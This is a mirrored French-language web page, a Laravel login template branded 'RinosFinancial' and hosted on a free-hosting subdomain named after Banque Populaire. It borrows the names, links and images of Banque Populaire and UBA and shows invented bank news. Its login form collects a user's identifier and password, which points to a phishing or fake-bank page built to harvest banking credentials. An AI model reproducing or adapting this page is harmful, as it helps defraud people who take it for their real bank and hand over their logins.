<!DOCTYPE html>
<html lang="fr">
				
<!-- Mirrored from banqpopulaire-grp-fr.000webhostapp.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Feb 2022 13:43:43 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
<head>
					<!-- Security Software provided by Platinum Mirror LTD (Programmer: Daniel Chatfield), Version: 5.0.3, License: Consumer -->
					<meta charset="utf-8" />
					<meta name="robots" content="noindex">
					<link href="https://rinosfinancial.com/public/img/favicon.ico" rel="shortcut icon" />
					
					<title>RinosFinancial | Login</title>
					<link rel="stylesheet" type="text/css" href="{{asset('design/styles.css')}}" media="all"/>
					<link rel="stylesheet" type="text/css" href="{{asset('bas/bas.css')}}" media="all"/>
					<link rel="stylesheet" type="text/css" href="{{asset('elementmenu.css')}}" media="all"/>
					<link rel="stylesheet" type="text/css" href="{{asset('footer.css')}}" media="all"/>
                    <link rel="stylesheet" type="text/css" href="{{asset('dist/sweetalert.css')}}">

					<script type="text/javascript" src="{{asset('js/jquery.min.js')}}"></script>

					<script src="{{asset('js/jquery.min.js')}}"></script>
                    <script src="{{asset('js/bootstrap.min.js')}}"></script>
                    <script src="{{asset('js/bootstrap.js')}}"></script>
                    <script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
					<link rel="shortcut icon" href="images/icoUBA.png">
	
					<script src="{{asset('js/jquery-1.10.2.min.js')}}"></script>
                     <script src="{{asset('dist/sweetalert.min.js')}}"></script>

					
					
					<link rel="stylesheet" href="{{asset('css/orman.css')}}" type="text/css" media="screen" />
					<link rel="stylesheet" href="{{asset('css/nivo-slider.css')}}" type="text/css" media="screen" />	
					
					<meta name="google-site-verification" content="gAGcBC_y3W4q9G2w1CW19dQKh_yWGbPohDWtEsNsLVM" />
					
				</head>
	<body>
	<div id="corps">
					
					<div class="login-form">
					<div style="font: 41.25%/2 arial,helvetica,sans-serif; color: #555; font-size: 18px;" align="center"><b>Authentification</b></div>
							
							<center><form method="post" action="{{route('login')}}">
								@csrf
							<label for="password"><center>Entrez votre identifiant et mot de passe</center>
                           
							
							

							<br>
							<table>
							<tr><td><strong><center>Identifiant</center></strong></td></tr> 
							
							<tr><td><center><input  class="input" type="text" name="login"/></center><td>
							@error('login')
                                    <span id='loginerrors' class="text-danger">{{$message}}</span>
                                  @enderror
							</tr>
							
							<tr><td><strong><center>Mot de passe</center></strong></td></tr> 
							<tr><td><center><input  class="input" type="password" name="password" /></center><td>
							@error('password')
                                    <span id=passworderrors class='text-danger'>{{$message}}</span>
                                    @enderror
							</tr>
							</label>
							<tr><td><center><input id="submit" class="" type="submit" name="private_blog_submit" value="Login" /></center></td></tr>
							</table>
							<center><a href="{{route('register')}}">Créer un compte</a></center>
							
							</form></center>
							
		</div>
		
		<div id="gauche">
    	 <div class="slider-wrapper theme-orman">
            <div id="slider" class="nivoSlider">
            	<img src="{{asset('images/slider/0A.jpg')}}" alt="Homepage Slider" title="RinosFinancial" />
                <img src="{{asset('images/slider/0B.jpg')}}" alt="Web Design" title="Une Banque Fiable" />
                <img src="{{asset('images/slider/0C.jpg')}}" alt="New Template" title="Partout ou Vous Irez." />
                <img src="{{asset('images/slider/0D.jpg')}}" alt="Business Website" title="A Votre Ecoute" />
            </div>
            <div class="nivo-controlNav-bg"></div>
        </div> 
		<script type="text/javascript" src="{{asset('js/jquery-1.6.1.min.js')}}"></script>
        <script type="text/javascript" src="{{asset('js/jquery.nivo.slider.pack.js')}}"></script>
        <script type="text/javascript">
        $(window).load(function() {
            $('#slider').nivoSlider({
				controlNav:true
			});
        });
        </script>
    </div>
		
		
		
		
		<div id="bas">
		<div class="top1"><a href="#"><img src="{{asset('images/homepgudirect.jpg')}}" width="200px" height="180px"></div>
		<div class="top2"><a href="#"><img src="{{asset('images/homepgcards.jpg')}}" width="200px" height="180px"></div>
	  <div class="top3"><a href="#"><img src="{{asset('images/homepgumobile.jpg')}}" width="200px" height="180px"></a></div>
	  <div class="top4"><a href="#"><img src="{{asset('images/lolo41.jpg')}}" width="320px" height="180px"></a></div>
	  </div>
	  
	  
	  
	    
	  
 
	  
		<div class="block_red"><strong><marquee>RinosFinancial  Contact us</marquee></strong>
		
		<marquee>Email: contact@rinosfinancial.com</marquee>
		
		</div>
  
<div id="menu2">
    <ul id="nav">
        
    <li><a href="https://www.ubagroup.com/countries/ng/personalbanking/eproducts" style="border-left:none;">E-products</a>
    <ul>
        <li><a href="#">U-Direct</a></li>
        <li><a href="#">U-Mobile</a></li>
        <li><a href="#">Paiements</a></li>
        <li><a href="#">U-Bills</a></li>
        <li><a href="#">Portails</a></li>
        <li><a href="#">Solution de Paiement</a></li>
        <li><a href="#">ATM Services</a></li>
    </ul>
</li>
    <li><a href="#">Cartes</a></li>
    <li><a href="#" style="border-right:none;">services bancaires personnels</a>
    <ul>
        <li><a href="#">Ouvrir un compte banque populaire en ligne</a></li>
        <li><a href="#">Comptes d'épargne</a></li>
        <li><a href="#">Compte courant</a></li>
        <li><a href="#">Transferts d'argent</a></li>
    </ul>
</li>
    </ul>
</div>




<div id="menu">
    <ul class="nav">
        
    <li><a href="#" >Accueil</a></li>
    <li><a href="#">Groupe</a></li>
    <li><a href="#">Investissement</a></li>
    <li><a href="#">charge Sociale</a></li>
    <li><a href="#">Centre sécurité</a></li>
    <li><a href="#">Carrières</a></li>
    <li><a href="#">Rapport fraude</a></li>
	<li><a href="https://rinosfinancial.com/rinos/contact">Contactez nous</a></li>
    </ul>
</div>


            
	



<div id="footer">



<div id="menufooter">
    <ul id="navfooter">
        
   <li><a href="index-2.html" style="border-left:none;" class="navactive">Accueil</a></li>
   <li><a href="#">Investissement</a></li>
   <li><a href="#">charge Sociale</a></li>
   <li><a href="#">Carrières</a></li>
   <li><a href="#" style="border-right:none;">Rapport fraude</a></li>
    </ul>
</div>






<div class="trait"></div>

		<div class="box_pub_h">
				<table border="0" cellpadding="0" cellspacing="0" width="100%">
						<tbody>
								<tr>
										<td align="left">
                  Nouvelles du groupe
              </td>
										<td align="right">
												<a href="#">
Nouvelles archivées </a>
										</td>
										<td align="right" width="26">
												<a href="#">
												</a>
										</td>
								</tr>
						</tbody>
				</table>
		</div>

<div class="trait1"></div>




<div class="boxnews_d">12 Mai, 2019</div>
<div class="boxnews_h">
<a href="#">bmce  lance la solution de paiement innovante</a>
</div>


<div class="boxnews_d7">24 Juin, 2019</div>
<div class="boxnews_h7"><a href="#">Les actionnaires saluent le conseil et la direction de la bqp </a></div>



<div class="boxnews_d8">15 Septembre, 2019</div>
<div class="boxnews_h8"><a href="#">bqp  enregistre une croissance de 35% de ses bénéfices, <br>Des projets plus performants en 2019 </a></div>


<div class="boxnews_d9">9 Janvier, 2018</div>
<div class="boxnews_h9"><a href="#">Avis de la 53ème Assemblée Générale de bqp  Plc</a></div>





<div class="boxnews">26 Mars, 2018</div>
<div class="boxnews_1"><a href="#">bqp maintient sa croissance, Grosses N290 <br> Milliards de gains en 2017</a></div>

<div class="boxnews2"> 8 Avril, 2018</div>
<div class="boxnews_2"><a href="#">Cotisation obligataire:bqp présente une émission de 30,5 M</a></div>



<div id="leslogos">
<table cellspacing="" cellpadding="" border="0">
<tr>
<td><span>LA BANQUE MONDIALE </span></td>
<td><a href="#" ><img src="{{asset('images/logo/twitter.gif')}}" width="20" height="20" alt="Facebook" longdesc="index-2.html"></a></td>
<td><a href="#" ><img src="{{asset('images/logo/face.gif')}}" width="20" height="20" alt="Facebook" longdesc="index-2.html"></a></td>
<td><a href="#" ><img src="{{asset('images/logo/soc3.gif')}}" width="20" height="20" alt="Facebook" longdesc="index-2.html"></td>
<td><a href="#" ><img src="{{asset('images/logo/googlepluslogo.jpg')}}" width="20" height="20" alt="Facebook" longdesc="index-2.html"></td>
<td><a href="#" ><img src="{{asset('images/logo/bloggericon.jpg')}}" width="20" height="20" alt="Facebook" longdesc="index-2.html"></td>
</tr>
</table>
</div>
</div>
	
	
	
	


<div id="menu3">
    <ul id="nav3">
        
    <li><a href="#" style="border-left:none;">Site map</a></li>
    <li><a href="espacecompte/contactus.html">Contact Us</a></li>
    <li><a href="#" style="border-right:none;">Countries</a></li>
    </ul>
</div>

<div id="foot_copy">
<table border="0" cellpadding="0" cellspacing="0">
<tbody><tr>
<td nowrap="true">

<div id="menu1a">
    <div id="nav1a">
        <a href="#" style="border-left:none;">Terms &amp; Conditions</a>/<a href="#" style="border-right:none;">Privacy Policy</a>
    </div>
</div>
</td>
<td>
<span>/&nbsp; © 2019. All Rights Reserved.</span>
</td>
</tr>
</tbody></table>
</div>
	
	
	
	
	
	
	










	
	  
	  
	  
	  
	  
</div>
	
<style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div></body>

<!-- Mirrored from banqpopulaire-grp-fr.000webhostapp.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 28 Feb 2022 13:43:56 GMT -->
</html>